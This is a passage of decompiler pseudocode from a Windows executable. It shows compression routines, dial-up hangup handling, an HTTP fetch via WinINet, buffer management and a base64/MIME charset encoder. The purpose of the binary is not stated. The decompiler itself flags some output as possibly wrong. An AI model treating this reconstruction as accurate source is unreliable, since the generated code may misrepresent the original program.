      v38 = *(unsigned __int16 *)(a3 + 4 * v36 + 2);
      v64 = v36;
      if ( v37 <= 16 - (unsigned __int16)v38 )
      {
        v5 = a2;
        *(_WORD *)(result + 5808) |= *(_WORD *)(a3 + 4 * v36) << v37;
        *(_DWORD *)(result + 5812) = v38 + v37;
      }
      else
      {
        v39 = *(_WORD *)(a3 + 4 * v36);
        v40 = *(_DWORD *)(result + 8);
        *(_WORD *)(result + 5808) |= v39 << v37;
        *(_BYTE *)(*(_DWORD *)(result + 20) + v40) = *(_BYTE *)(result + 5808);
        v41 = *(_DWORD *)(result + 20) + 1;
        v42 = *(_BYTE *)(result + 5809);
        *(_DWORD *)(result + 20) = v41;
        *(_BYTE *)(*(_DWORD *)(result + 8) + v41) = v42;
        v43 = *(_DWORD *)(result + 5812);
        ++*(_DWORD *)(result + 20);
        v5 = a2;
        *(_WORD *)(result + 5808) = v39 >> (16 - v43);
        v44 = v43 + v38 - 16;
        v36 = v64;
        *(_DWORD *)(result + 5812) = v44;
      }
      v45 = dword_41F620[v36];
      if ( !v45 )
        goto LABEL_24;
      v46 = v35 - dword_41FF64[v36];
      v47 = *(_DWORD *)(result + 5812);
      if ( v47 <= 16 - v45 )
      {
        *(_WORD *)(result + 5808) |= v46 << v47;
        v15 = v45 + v47;
LABEL_23:
        *(_DWORD *)(result + 5812) = v15;
        goto LABEL_24;
      }
      v48 = v46 << v47;
      v49 = *(_DWORD *)(result + 8);
      *(_WORD *)(result + 5808) |= v48;
      *(_BYTE *)(v49 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
      v50 = *(_DWORD *)(result + 8);
      LOBYTE(v49) = *(_BYTE *)(result + 5809);
      v51 = *(_DWORD *)(result + 20) + 1;
      *(_DWORD *)(result + 20) = v51;
      *(_BYTE *)(v51 + v50) = v49;
      v52 = *(_DWORD *)(result + 5812);
      ++*(_DWORD *)(result + 20);
      *(_DWORD *)(result + 5812) = v52 + v45 - 16;
      *(_WORD *)(result + 5808) = (unsigned __int16)v46 >> (16 - v52);
LABEL_24:
      v4 = v62;
      if ( v62 >= *(_DWORD *)(result + 5784) )
        goto LABEL_25;
    }
    LOWORD(v6) = *(_WORD *)(v5 + 4 * v7 + 2);
    v8 = *(_DWORD *)(result + 5812);
    if ( v8 <= 16 - (unsigned __int16)v6 )
    {
      *(_WORD *)(result + 5808) |= *(_WORD *)(v5 + 4 * v7) << v8;
      v15 = v6 + v8;
    }
    else
    {
      v9 = *(_WORD *)(v5 + 4 * v7);
      v10 = v9 << v8;
      v11 = *(_DWORD *)(result + 8);
      *(_WORD *)(result + 5808) |= v10;
      *(_BYTE *)(v11 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
      v12 = *(_DWORD *)(result + 8);
      v13 = *(_DWORD *)(result + 20) + 1;
      *(_DWORD *)(result + 20) = v13;
      *(_BYTE *)(v13 + v12) = *(_BYTE *)(result + 5809);
      v14 = *(_DWORD *)(result + 5812);
      ++*(_DWORD *)(result + 20);
      v15 = v14 + v6 - 16;
      *(_WORD *)(result + 5808) = v9 >> (16 - v14);
    }
    goto LABEL_23;
  }
LABEL_25:
  v53 = *(_DWORD *)(result + 5812);
  v54 = *(unsigned __int16 *)(v5 + 1026);
  if ( v53 <= 16 - (unsigned __int16)v54 )
  {
    *(_WORD *)(result + 5808) |= *(_WORD *)(v5 + 1024) << v53;
    *(_DWORD *)(result + 5812) = v54 + v53;
  }
  else
  {
    v55 = *(_WORD *)(v5 + 1024);
    v56 = v55 << v53;
    v57 = *(_DWORD *)(result + 8);
    *(_WORD *)(result + 5808) |= v56;
    *(_BYTE *)(v57 + *(_DWORD *)(result + 20)) = *(_BYTE *)(result + 5808);
    v58 = *(_DWORD *)(result + 8);
    LOBYTE(v57) = *(_BYTE *)(result + 5809);
    v59 = *(_DWORD *)(result + 20) + 1;
    *(_DWORD *)(result + 20) = v59;
    *(_BYTE *)(v59 + v58) = v57;
    v60 = *(_DWORD *)(result + 5812);
    ++*(_DWORD *)(result + 20);
    *(_WORD *)(result + 5808) = v55 >> (16 - v60);
    *(_DWORD *)(result + 5812) = v60 + v54 - 16;
  }
  *(_DWORD *)(result + 5804) = *(unsigned __int16 *)(v5 + 1026);
  return result;
}
// 41F5AC: using guessed type int dword_41F5AC[29];
// 41F620: using guessed type int dword_41F620[];
// 41FEF0: using guessed type int dword_41FEF0[29];
// 41FF64: using guessed type int dword_41FF64[171];

//----- (00407B90) --------------------------------------------------------
BOOL __cdecl sub_407B90(int a1)
{
  unsigned int v1; // edi
  unsigned int v2; // edx
  unsigned __int16 *v3; // eax
  int v4; // ecx
  unsigned __int16 v5; // si
  unsigned __int16 *v6; // eax
  int v7; // ecx
  unsigned __int16 v8; // bp
  unsigned __int16 *v9; // ecx
  int v10; // eax
  unsigned __int16 v11; // si
  unsigned int v12; // edi
  BOOL result; // eax

  v1 = 0;
  v2 = 0;
  v3 = (unsigned __int16 *)(a1 + 140);
  v4 = 7;
  do
  {
    v5 = *v3;
    v3 += 2;
    v2 += v5;
    --v4;
  }
  while ( v4 );
  v6 = (unsigned __int16 *)(a1 + 168);
  v7 = 121;
  do
  {
    v8 = *v6;
    v6 += 2;
    v1 += v8;
    --v7;
  }
  while ( v7 );
  v9 = (unsigned __int16 *)(a1 + 652);
  v10 = 128;
  do
  {
    v11 = *v9;
    v9 += 2;
    v2 += v11;
    --v10;
  }
  while ( v10 );
  v12 = v1 >> 2;
  result = v2 <= v12;
  *(_BYTE *)(a1 + 28) = v2 <= v12;
  return result;
}

//----- (00407C10) --------------------------------------------------------
unsigned int __cdecl sub_407C10(unsigned int a1, int a2)
{
  unsigned int v4; // eax
  int v5; // esi

  v4 = 0;
  do
  {
    v5 = a1 & 1;
    a1 >>= 1;
    v4 = 2 * (v5 | v4);
    --a2;
  }
  while ( a2 > 0 );
  return v4 >> 1;
}

//----- (00407C30) --------------------------------------------------------
int __cdecl sub_407C30(int a1)
{
  int result; // eax
  int v2; // edx
  int v3; // esi
  int v4; // edx

  result = a1;
  v2 = *(_DWORD *)(a1 + 5812);
  if ( v2 <= 8 )
  {
    if ( v2 > 0 )
      *(_BYTE *)(*(_DWORD *)(a1 + 8) + (*(_DWORD *)(a1 + 20))++) = *(_BYTE *)(a1 + 5808);
    *(_WORD *)(a1 + 5808) = 0;
    *(_DWORD *)(a1 + 5812) = 0;
  }
  else
  {
    *(_BYTE *)(*(_DWORD *)(a1 + 8) + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
    v3 = *(_DWORD *)(a1 + 8);
    v4 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v4;
    *(_BYTE *)(v3 + v4) = *(_BYTE *)(a1 + 5809);
    ++*(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) = 0;
    *(_DWORD *)(a1 + 5812) = 0;
  }
  return result;
}

//----- (00407CB0) --------------------------------------------------------
_BYTE *__cdecl sub_407CB0(_DWORD *a1, _BYTE *a2, int a3, int a4)
{
  int v4; // edi
  int v5; // edx
  int v6; // edi
  int v7; // ecx
  int v8; // edi
  int v9; // ecx
  _BYTE *result; // eax
  int v11; // ecx

  sub_407C30((int)a1);
  a1[1451] = 8;
  if ( a4 )
  {
    *(_BYTE *)(a1[5] + a1[2]) = a3;
    v4 = a1[2];
    v5 = a1[5] + 1;
    a1[5] = v5;
    *(_BYTE *)(v5 + v4) = BYTE1(a3);
    v6 = a1[2];
    v7 = a1[5] + 1;
    a1[5] = v7;
    *(_BYTE *)(v7 + v6) = ~(_BYTE)a3;
    v8 = a1[5] + 1;
    v9 = a1[2];
    a1[5] = v8;
    *(_BYTE *)(v8 + v9) = ~BYTE1(a3);
    ++a1[5];
  }
  result = (_BYTE *)(a3 - 1);
  if ( a3 )
  {
    v11 = a3;
    result = a2;
    do
    {
      *(_BYTE *)(a1[5] + a1[2]) = *result++;
      --v11;
      ++a1[5];
    }
    while ( v11 );
  }
  return result;
}

//----- (00407D60) --------------------------------------------------------
void sub_407D60()
{
  dword_437740 = (int)&unk_437748;
}
// 437740: using guessed type int dword_437740;

//----- (00407D70) --------------------------------------------------------
int __cdecl sub_407D70(_DWORD *a1, int a2, LPCSTR *a3)
{
  _DWORD *v3; // eax
  int v5[4]; // [esp+0h] [ebp-14h] BYREF
  unsigned int v6; // [esp+10h] [ebp-4h]

  sub_408730(v5);
  sub_4082E0((HINTERNET *)(dword_437740 + 168), *a3, v5);
  v3 = sub_408090(v6 != 0 ? (const void *)v5[2] : 0, v6);
  v5[0] = (int)&off_420210;
  *a1 = v3;
  return sub_408930((int)v5);
}
// 420210: using guessed type void *off_420210;
// 437740: using guessed type int dword_437740;

//----- (00407DD0) --------------------------------------------------------
DWORD __cdecl sub_407DD0(HRASCONN a1)
{
  DWORD TickCount; // edi
  DWORD result; // eax
  int v3[40]; // [esp+10h] [ebp-A0h] BYREF

  RasHangUpA(a1);
  memset(v3, 0, sizeof(v3));
  v3[0] = 160;
  TickCount = GetTickCount();
  for ( result = GetTickCount() - TickCount; result < 0xBB8; result = GetTickCount() - TickCount )
  {
    result = RasGetConnectStatusA(a1, (struct tagRASCONNSTATUSA *)v3);
    if ( result == 6 )
      break;
    Sleep(0);
  }
  return result;
}

//----- (00407E50) --------------------------------------------------------
_DWORD *__thiscall sub_407E50(_DWORD *this)
{
  sub_409B20(this);
  sub_409190(this + 15);
  sub_408120(this + 42);
  this[47] = 0;
  this[48] = 0;
  sub_407F40();
  return this;
}

//----- (00407ED0) --------------------------------------------------------
int __thiscall sub_407ED0(SOCKET *this)
{
  sub_407F50((int)this);
  sub_408150((CDaoRecordset *)(this + 42));
  sub_409210((int)(this + 15));
  return sub_409B90(this);
}

//----- (00407F40) --------------------------------------------------------
BOOL sub_407F40()
{
  return sub_41DD1D(0) != 0;
}

//----- (00407F50) --------------------------------------------------------
int __thiscall sub_407F50(int this)
{
  int v2; // edi
  HRASCONN v3; // edx
  int v5[40]; // [esp+8h] [ebp-A0h] BYREF

  v2 = this + 60;
  sub_4093F0((void **)(this + 60));
  sub_4094A0(v2);
  sub_409C10((SOCKET *)this);
  CDaoRecordset::ResetCursor((CDaoRecordset *)(this + 168));
  v3 = *(HRASCONN *)(this + 188);
  if ( v3 )
  {
    *(_DWORD *)(this + 192) = 0;
    memset(v5, 0, sizeof(v5));
    v5[0] = 160;
    if ( RasGetConnectStatusA(v3, (struct tagRASCONNSTATUSA *)v5) || v5[1] != 0x2000 )
      sub_407DD0(*(HRASCONN *)(this + 188));
    *(_DWORD *)(this + 188) = 0;
  }
  return 0;
}

//----- (00407FF0) --------------------------------------------------------
int sub_407FF0()
{
  unknown_libname_8();
  return atexit(unknown_libname_9);
}
// 408000: using guessed type int unknown_libname_8(void);

//----- (00408030) --------------------------------------------------------
int __stdcall sub_408030(int a1, int a2, int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_437810 = a2;
  return result;
}
// 437810: using guessed type int dword_437810;

//----- (00408050) --------------------------------------------------------
int __stdcall sub_408050(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_437810 )
  {
    result = dword_437810(a1, a2, a3);
    dword_43780C = result;
  }
  else
  {
    dword_43780C = 0;
    return 0;
  }
  return result;
}
// 437810: invalid function type '?' has been ignored
// 43780C: using guessed type int dword_43780C;
// 437810: using guessed type int (__stdcall *dword_437810)(_DWORD, _DWORD, _DWORD);

//----- (00408090) --------------------------------------------------------
_DWORD *__cdecl sub_408090(const void *a1, unsigned int a2)
{
  _DWORD *result; // eax

  if ( !a2 )
    return 0;
  result = (_DWORD *)sub_408050(2024, a2 + 8, 0);
  result[1] = a2;
  *result = 1;
  qmemcpy(result + 2, a1, a2);
  return result;
}

//----- (004080E0) --------------------------------------------------------
int __stdcall sub_4080E0(int a1, int a2, int a3)
{
  return sub_408030(a1, a2, a3);
}

//----- (00408110) --------------------------------------------------------
void sub_408110()
{
  dword_437814 = (int)&unk_437748;
}
// 437814: using guessed type int dword_437814;

//----- (00408120) --------------------------------------------------------
_DWORD *__thiscall sub_408120(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[1] = off_4276D4;
  this[2] = off_4276D4;
  this[3] = off_4276D4;
  *this = 0;
  return result;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00408150) --------------------------------------------------------
void __thiscall sub_408150(CDaoRecordset *this)
{
  CDaoRecordset::ResetCursor(this);
  sub_417CB2((_DWORD *)this + 3);
  sub_417CB2((_DWORD *)this + 2);
  sub_417CB2((_DWORD *)this + 1);
}

//----- (004081C0) --------------------------------------------------------
BOOL __thiscall sub_4081C0(HINTERNET *this)
{
  if ( !*this )
    *this = InternetOpenA(
              szAgent,
              *((_DWORD *)this[1] - 2) != 0 ? 3 : 1,
              *((_DWORD *)this[1] - 2) != 0 ? (LPCSTR)this[1] : 0,
              0,
              0);
  return *this != 0;
}

//----- (00408210) --------------------------------------------------------
HINTERNET __thiscall sub_408210(HINTERNET *this)
{
  HINTERNET result; // eax

  result = *this;
  if ( *this )
  {
    result = (HINTERNET)InternetCloseHandle(*this);
    *this = 0;
  }
  return result;
}

//----- (00408250) --------------------------------------------------------
BOOL __thiscall sub_408250(int this, HINTERNET hInternet)
{
  int v3; // eax
  int Buffer; // [esp+Ch] [ebp-Ch] BYREF
  int v6; // [esp+10h] [ebp-8h]
  int v7; // [esp+14h] [ebp-4h]

  v3 = *(_DWORD *)(this + 4);
  v7 = 0;
  if ( *(_DWORD *)(v3 - 8) )
  {
    Buffer = 3;
    v6 = v3;
  }
  else
  {
    Buffer = 0;
    v6 = 0;
  }
  InternetSetOptionA(*(HINTERNET *)this, 0x26u, &Buffer, 0xCu);
  InternetSetOptionA(hInternet, 0x2Bu, *(LPVOID *)(this + 8), *(_DWORD *)(*(_DWORD *)(this + 8) - 8) + 1);
  return InternetSetOptionA(hInternet, 0x2Cu, *(LPVOID *)(this + 12), *(_DWORD *)(*(_DWORD *)(this + 12) - 8) + 1);
}

//----- (004082C0) --------------------------------------------------------
HINTERNET __thiscall sub_4082C0(HINTERNET *this)
{
  HINTERNET result; // eax

  result = this[4];
  if ( result )
  {
    result = (HINTERNET)InternetCloseHandle(this[4]);
    this[4] = 0;
  }
  return result;
}

//----- (004082E0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __thiscall sub_4082E0(HINTERNET *this, LPCSTR lpszObjectName, _DWORD *a3)
{
  LPCSTR v3; // esi
  bool v4; // zf
  void *v7; // eax
  void *v8; // esi
  void *v9; // ebx
  int v10; // eax
  DWORD v11; // eax
  _BYTE *v12; // esi
  const char **v13; // [esp-14h] [ebp-ACh]
  int v14; // [esp-10h] [ebp-A8h] BYREF
  char Buffer[32]; // [esp+Ch] [ebp-8Ch] BYREF
  int v16[5]; // [esp+2Ch] [ebp-6Ch] BYREF
  char v17[4]; // [esp+40h] [ebp-58h] BYREF
  LPCSTR lpszAcceptTypes[2]; // [esp+48h] [ebp-50h] BYREF
  DWORD dwNumberOfBytesRead; // [esp+54h] [ebp-44h] BYREF
  int v20; // [esp+58h] [ebp-40h] BYREF
  INTERNET_PORT nServerPort[2]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v22; // [esp+60h] [ebp-38h]
  void *v23; // [esp+64h] [ebp-34h]
  DWORD dwFlags; // [esp+68h] [ebp-30h] BYREF
  void *v25; // [esp+6Ch] [ebp-2Ch]
  DWORD dwService; // [esp+70h] [ebp-28h] BYREF
  DWORD dwBufferLength; // [esp+74h] [ebp-24h] BYREF
  LPCSTR lpszServerName; // [esp+78h] [ebp-20h] BYREF
  LPCSTR lpszUserName; // [esp+7Ch] [ebp-1Ch] BYREF
  LPCSTR lpszPassword; // [esp+80h] [ebp-18h] BYREF
  LPCSTR lpszUrl[2]; // [esp+84h] [ebp-14h] BYREF
  int v32; // [esp+94h] [ebp-4h]

  v3 = lpszObjectName;
  v4 = lpszObjectName == 0;
  lpszUrl[1] = (LPCSTR)&v14;
  a3[4] = 0;
  if ( v4 || !*v3 )
    return 0;
  v25 = 0;
  v23 = 0;
  v22 = 0;
  AFX_EXCEPTION_LINK::AFX_EXCEPTION_LINK((AFX_EXCEPTION_LINK *)v17);
  v32 = 5;
  lpszServerName = (LPCSTR)off_4276D4;
  lpszObjectName = (LPCSTR)off_4276D4;
  lpszUserName = (LPCSTR)off_4276D4;
  lpszPassword = (LPCSTR)off_4276D4;
  sub_417D20((CString *)lpszUrl, v3);
  LOBYTE(v32) = 6;
  sub_4162F8((const unsigned __int8 **)lpszUrl, (CString *)&dwFlags, Control);
  sub_417CB2(&dwFlags);
  if ( !sub_41C182(
          lpszUrl[0],
          &dwService,
          (CString *)&lpszServerName,
          (CString *)&lpszObjectName,
          nServerPort,
          (CString *)&lpszUserName,
          (CString *)&lpszPassword,
          0x20000000u) )
    goto LABEL_7;
  dwFlags = -2080374784;
  if ( dwService == 4107 )
  {
    dwService = 3;
    dwFlags = -2071986176;
  }
  if ( sub_4081C0(this) )
  {
    v7 = InternetConnectA(*this, lpszServerName, nServerPort[0], lpszUserName, lpszPassword, dwService, 0, 0);
    v8 = v7;
    v25 = v7;
    if ( v7 )
    {
      sub_408250((int)this, v7);
      v13 = (const char **)sub_4162F8((const unsigned __int8 **)&lpszObjectName, (CString *)&v20, Control);
      LOBYTE(v32) = 7;
      sub_417D9F((void **)&lpszObjectName, v13);
      LOBYTE(v32) = 6;
      sub_417CB2(&v20);
      lpszAcceptTypes[0] = aAccept;
      lpszAcceptTypes[1] = 0;
      v9 = HttpOpenRequestA(v8, szVerb, lpszObjectName, szVersion, 0, lpszAcceptTypes, dwFlags, 0);
      v23 = v9;
      if ( v9 && HttpSendRequestA(v9, szHeaders, strlen(szHeaders), 0, 0) )
      {
        dwBufferLength = 32;
        if ( HttpQueryInfoA(v9, 5u, Buffer, &dwBufferLength, 0) && (v10 = atol(Buffer), v10 > 0) )
        {
          v11 = v10 + 1;
          if ( v11 <= 0x19000 )
            dwBufferLength = v11;
          else
            dwBufferLength = 102400;
        }
        else
        {
          dwBufferLength = 10240;
        }
        sub_408730(v16);
        LOBYTE(v32) = 8;
        v12 = sub_408750(v16, dwBufferLength);
        if ( v12 )
        {
          while ( InternetReadFile(v9, v12, dwBufferLength, &dwNumberOfBytesRead) )
          {
            if ( !dwNumberOfBytesRead )
            {
              v22 = 1;
              break;
            }
            sub_4089C0(a3, v12, dwNumberOfBytesRead);
          }
        }
        LOBYTE(v32) = 6;
        v16[0] = (int)&off_420214;
        sub_408930((int)v16);
        LOBYTE(v32) = 5;
        sub_417CB2(lpszUrl);
        LOBYTE(v32) = 4;
        sub_417CB2(&lpszPassword);
        LOBYTE(v32) = 3;
        sub_417CB2(&lpszUserName);
        LOBYTE(v32) = 2;
        sub_417CB2(&lpszObjectName);
        LOBYTE(v32) = 1;
        sub_417CB2(&lpszServerName);
        v32 = -1;
        AfxTryCleanup();
        v8 = v25;
      }
      else
      {
        LOBYTE(v32) = 5;
        sub_417CB2(lpszUrl);
        LOBYTE(v32) = 4;
        sub_417CB2(&lpszPassword);
        LOBYTE(v32) = 3;
        sub_417CB2(&lpszUserName);
        LOBYTE(v32) = 2;
        sub_417CB2(&lpszObjectName);
        LOBYTE(v32) = 1;
        sub_417CB2(&lpszServerName);
        v32 = -1;
        AfxTryCleanup();
      }
      if ( v9 )
        InternetCloseHandle(v9);
    }
    else
    {
      LOBYTE(v32) = 5;
      sub_417CB2(lpszUrl);
      LOBYTE(v32) = 4;
      sub_417CB2(&lpszPassword);
      LOBYTE(v32) = 3;
      sub_417CB2(&lpszUserName);
      LOBYTE(v32) = 2;
      sub_417CB2(&lpszObjectName);
      LOBYTE(v32) = 1;
      sub_417CB2(&lpszServerName);
      v32 = -1;
      AfxTryCleanup();
    }
    if ( v8 )
      InternetCloseHandle(v8);
    return v22;
  }
  else
  {
LABEL_7:
    LOBYTE(v32) = 5;
    sub_417CB2(lpszUrl);
    LOBYTE(v32) = 4;
    sub_417CB2(&lpszPassword);
    LOBYTE(v32) = 3;
    sub_417CB2(&lpszUserName);
    LOBYTE(v32) = 2;
    sub_417CB2(&lpszObjectName);
    LOBYTE(v32) = 1;
    sub_417CB2(&lpszServerName);
    v32 = -1;
    AfxTryCleanup();
    return v22;
  }
}
// 4086F2: positive sp value 10 has been found
// 420214: using guessed type void *off_420214;
// 4276D4: using guessed type void *off_4276D4;
// 4082E0: using guessed type char var_58[4];

//----- (00408730) --------------------------------------------------------
_DWORD *__thiscall sub_408730(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_420218;
  this[1] = &unk_437818;
  this[2] = 0;
  this[4] = 0;
  this[3] = 0;
  return result;
}
// 420218: using guessed type void *off_420218;

//----- (00408750) --------------------------------------------------------
LPVOID __thiscall sub_408750(_DWORD *this, signed int a2)
{
  LPVOID result; // eax
  int v4; // eax
  int v5; // eax
  int v6; // edx
  HANDLE ProcessHeap; // eax

  if ( this[2] )
    return sub_408820((int)this, a2);
  if ( !a2 )
    return 0;
  if ( dword_427370 == 1 && a2 <= 512 && (v4 = this[1], *(int *)v4 < 96) )
  {
    v5 = sub_408AD0((_BYTE *)(v4 + 4), 96, 0);
    *(_BYTE *)(this[1] + v5 + 4) = 1;
    ++*(_DWORD *)this[1];
    v6 = this[1];
    this[4] = a2;
    this[3] = 512;
    result = (LPVOID)((v5 << 9) + v6 + 100);
    this[2] = result;
  }
  else
  {
    ProcessHeap = dword_44387C;
    if ( !dword_44387C )
    {
      ProcessHeap = GetProcessHeap();
      dword_44387C = ProcessHeap;
    }
    result = HeapAlloc(ProcessHeap, 0, a2 + 128);
    this[2] = result;
    if ( result )
    {
      this[4] = a2;
      this[3] = a2 + 128;
    }
    else
    {
      this[3] = 0;
      this[4] = 0;
    }
  }
  return result;
}
// 427370: using guessed type int dword_427370;

//----- (00408820) --------------------------------------------------------
LPVOID __thiscall sub_408820(int this, signed int a2)
{
  LPVOID result; // eax
  int v5; // ecx
  BOOL v6; // esi
  signed int v7; // ecx
  HANDLE ProcessHeap; // eax
  void *v9; // eax
  signed int v10; // ecx
  void *v11; // [esp+10h] [ebp+4h]

  if ( !a2 )
  {
    sub_408930(this);
    return 0;
  }
  result = *(LPVOID *)(this + 8);
  if ( !result )
    return (LPVOID)sub_408750(a2);
  v5 = *(_DWORD *)(this + 4);
  v6 = (unsigned int)result >= v5 + 100 && (unsigned int)result < v5 + 49252;
  v7 = *(_DWORD *)(this + 12);
  if ( v7 >= a2 && (v6 || v7 - a2 <= 256) )
  {
    *(_DWORD *)(this + 16) = a2;
  }
  else
  {
    ProcessHeap = dword_44387C;
    if ( !dword_44387C )
    {
      ProcessHeap = GetProcessHeap();
      dword_44387C = ProcessHeap;
    }
    if ( v6 )
    {
      v9 = HeapAlloc(ProcessHeap, 0, a2 + 128);
      v11 = v9;
      if ( !v9 )
        return 0;
      v10 = *(_DWORD *)(this + 16);
      if ( a2 < v10 )
        v10 = a2;
      qmemcpy(v9, *(const void **)(this + 8), v10);
      sub_408950((_DWORD *)this, *(LPVOID *)(this + 8));
      result = v11;
      *(_DWORD *)(this + 16) = a2;
      *(_DWORD *)(this + 8) = v11;
      *(_DWORD *)(this + 12) = a2 + 128;
    }
    else
    {
      result = HeapReAlloc(ProcessHeap, 0, *(LPVOID *)(this + 8), a2 + 128);
      if ( !result )
        return 0;
      *(_DWORD *)(this + 12) = a2 + 128;
      *(_DWORD *)(this + 16) = a2;
      *(_DWORD *)(this + 8) = result;
    }
  }
  return result;
}
// 408750: using guessed type _DWORD __stdcall sub_408750(_DWORD);

//----- (00408930) --------------------------------------------------------
int __thiscall sub_408930(int this)
{
  int result; // eax

  sub_408950((_DWORD *)this, *(LPVOID *)(this + 8));
  result = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 12) = 0;
  return result;
}

//----- (00408950) --------------------------------------------------------
void __thiscall sub_408950(_DWORD *this, LPVOID lpMem)
{
  int v2; // esi
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    v2 = this[1];
    if ( (unsigned int)lpMem < v2 + 100 || (unsigned int)lpMem >= v2 + 49252 )
    {
      ProcessHeap = dword_44387C;
      if ( !dword_44387C )
      {
        ProcessHeap = GetProcessHeap();
        dword_44387C = ProcessHeap;
      }
      HeapFree(ProcessHeap, 0, lpMem);
    }
    else
    {
      *(_BYTE *)(((int)lpMem - v2 - 100) / 512 + v2 + 4) = 0;
      --*(_DWORD *)this[1];
    }
  }
}

//----- (004089C0) --------------------------------------------------------
int __thiscall sub_4089C0(_DWORD *this, _BYTE *Src, signed int Size)
{
  int v3; // esi
  int result; // eax
  _BYTE *v5; // eax

  if ( Size > 0 )
  {
    v3 = this[4];
    result = (int)sub_408820((int)this, v3 + Size);
    if ( !result )
      return result;
    v5 = (_BYTE *)(v3 + result);
    if ( Src )
    {
      sub_408A20(v5, Src, Size);
      return 1;
    }
    sub_408A80(v5, Size);
  }
  return 1;
}

//----- (00408A20) --------------------------------------------------------
_BYTE *__cdecl sub_408A20(_BYTE *a1, _BYTE *Src, int Size)
{
  _BYTE *result; // eax

  result = (_BYTE *)Size;
  if ( Size )
  {
    switch ( Size )
    {
      case 1:
        result = Src;
        *a1 = *Src;
        break;
      case 2:
        result = Src;
        *(_WORD *)a1 = *(_WORD *)Src;
        break;
      case 4:
        result = Src;
        *(_DWORD *)a1 = *(_DWORD *)Src;
        break;
      default:
        return memcpy(a1, Src, Size);
    }
  }
  return result;
}

//----- (00408A80) --------------------------------------------------------
_BYTE *__cdecl sub_408A80(_BYTE *a1, unsigned int a2)
{
  _BYTE *result; // eax

  if ( a2 )
  {
    switch ( a2 )
    {
      case 1u:
        result = a1;
        *a1 = 0;
        break;
      case 2u:
        *(_WORD *)a1 = 0;
        break;
      case 4u:
        *(_DWORD *)a1 = 0;
        break;
      default:
        result = 0;
        memset(a1, 0, a2);
        break;
    }
  }
  return result;
}

//----- (00408AD0) --------------------------------------------------------
int __cdecl sub_408AD0(_BYTE *a1, int a2, unsigned __int8 a3)
{
  bool v3; // zf
  int v5; // ecx
  _BYTE *v6; // edi
  int v7; // [esp+4h] [ebp-4h]

  v7 = -1;
  if ( a2 > 0 )
  {
    v3 = *a1 == a3;
    if ( *a1 == a3 )
      return 0;
    v5 = a2;
    v6 = a1;
    do
    {
      if ( !v5 )
        break;
      v3 = *v6++ == a3;
      --v5;
    }
    while ( !v3 );
    if ( v3 )
      return a2 - (v5 + 1);
  }
  return v7;
}

//----- (00408B20) --------------------------------------------------------
int __cdecl sub_408B20(char *a1)
{
  char *v1; // ecx
  char v2; // al

  v1 = a1;
  v2 = *a1;
  if ( !*a1 )
    return 1;
  while ( v2 >= 0 )
  {
    v2 = *++v1;
    if ( !v2 )
      return 1;
  }
  return 0;
}

//----- (00408B40) --------------------------------------------------------
char *__cdecl sub_408B40(char *a1)
{
  bool v1; // zf
  char *result; // eax

  v1 = sub_408B20(a1) == 0;
  result = aUsAscii;
  if ( v1 )
    return aGb2312;
  return result;
}

//----- (00408B60) --------------------------------------------------------
void **__cdecl sub_408B60(int a1, int a2, int a3, int a4, void **a5)
{
  void **v5; // ebp
  void **v7; // esi
  CHAR *v8; // edi

  if ( 4 * ((a2 + 2) / 3) <= a3 || a2 <= 1 )
  {
    v7 = a5;
    if ( !a4 )
      sub_417EF4(a5, asc_427398);
    sub_417EF4(v7, aGb2312B);
    v8 = sub_408C80(a1, a2, &a4, 0);
    sub_417EF4(v7, v8);
    sub_417A1C(v8);
    return sub_417EF4(v7, asc_427388);
  }
  else
  {
    v5 = a5;
    sub_408B60(a1, a2 / 2, a3, a4, a5);
    return (void **)sub_408B60(a1 + a2 / 2, a2 - a2 / 2, a3, 0, v5);
  }
}

//----- (00408C20) --------------------------------------------------------
void **__cdecl sub_408C20(CHAR *lpString, CString *a2)
{
  if ( sub_408B20(lpString) )
    return (void **)CString::operator=(a2, lpString);
  else
    return sub_408B60((int)lpString, strlen(lpString), 68 - strlen(aGb2312), 1, (void **)a2);
}

//----- (00408C80) --------------------------------------------------------
_BYTE *__cdecl sub_408C80(int a1, int a2, _DWORD *a3, int a4)
{
  int v4; // ebp
  _BYTE *v5; // esi
  int v6; // ebx
  int v7; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // ebp
  int v11; // edi
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // eax
  int v16; // ebp
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  char v21; // al
  int v22; // ecx
  char v23; // al
  _BYTE *result; // eax
  int v25; // [esp+10h] [ebp-4Ch]
  int v26; // [esp+14h] [ebp-48h]
  char v27[68]; // [esp+18h] [ebp-44h] BYREF

  v4 = a2;
  strcpy(v27, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
  v5 = sub_4179F3(4 * ((a2 + 2) / 3) + 4 * ((a2 + 2) / 3) * strlen(asc_42739C) / 0x4C + 3);
  v6 = a1;
  v7 = 0;
  v8 = 0;
  v25 = 0;
  if ( a2 / 3 > 0 )
  {
    v26 = a2 / 3;
    while ( 1 )
    {
      v9 = *(unsigned __int8 *)(v8 + v6);
      v10 = *(unsigned __int8 *)(v8 + v6 + 1);
      v11 = v8 + 2;
      v12 = *(unsigned __int8 *)(v11 + v6);
      v8 = v11 + 1;
      v5[v7] = v27[(v9 >> 2) & 0x3F];
      v13 = v7 + 1;
      v5[v13] = v27[(16 * (v9 & 3)) | (v10 >> 4) & 0xF];
      v13 += 2;
      LOBYTE(v9) = v27[(4 * (v10 & 0xF)) | (v12 >> 6) & 3];
      LOBYTE(v12) = v27[v12 & 0x3F];
